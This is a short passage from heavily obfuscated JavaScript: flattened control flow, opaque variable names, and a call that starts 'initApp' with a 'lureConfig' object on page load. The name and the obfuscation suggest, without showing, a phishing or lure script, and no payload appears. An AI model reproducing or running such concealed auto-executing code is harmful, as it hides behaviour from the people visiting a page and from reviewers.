              _noop(_s5["\u6498"] = _s5["_v148"], __str_table__ += 333, _s1 += -127, _s2 += -401);
              break
            }
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(-78, 110, 43)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}));

function _noop() {
  _noop = function() {}
}
return addEventListener("load", () => {
  initApp(_v53["c"], lureConfig)
});